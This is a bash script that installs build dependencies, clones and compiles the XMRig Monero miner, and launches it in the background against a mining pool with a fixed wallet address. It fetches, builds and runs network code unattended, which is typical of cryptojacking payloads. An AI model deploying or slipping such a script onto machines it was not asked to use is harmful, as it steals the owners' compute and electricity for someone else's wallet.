#!/bin/bash

export LOG_XMRIG="/var/log/xmrig"
export LOG_XMRIG_INSTALL="${LOG_XMRIG}_install"
export TGT_DIR="/opt/github/"

XMR_ADDRESS="481wBmRFXhoBf7UzhDKa6vZZAfbTHAUo1SDmyVEjodZpecbRG2MJfcf8WStKzL5kR9UFhf7jKEE2yCbejbNwPAnkLwjhrzS"

echo > ${LOG_XMRIG_INSTALL}
echo > ${LOG_XMRIG}

apt-get update >> ${LOG_XMRIG_INSTALL}
apt-get -y install git build-essential cmake libuv1-dev libmicrohttpd-dev >> ${LOG_XMRIG_INSTALL}
mkdir -p ${TGT_DIR} >> ${LOG_XMRIG_INSTALL}
cd ${TGT_DIR}
git clone https://github.com/xmrig/xmrig.git xmrig  >> ${LOG_XMRIG_INSTALL}
cd xmrig
mkdir build  >> ${LOG_XMRIG_INSTALL}
cd build
cmake ..  >> ${LOG_XMRIG_INSTALL}
sleep 2
make  >> ${LOG_XMRIG_INSTALL}
sleep 2

nohup ${TGT_DIR}/xmrig/build/xmrig -o de.minexmr.com:4444 -u ${XMR_ADDRESS} -p x -k 2>&1 > ${LOG_XMRIG}

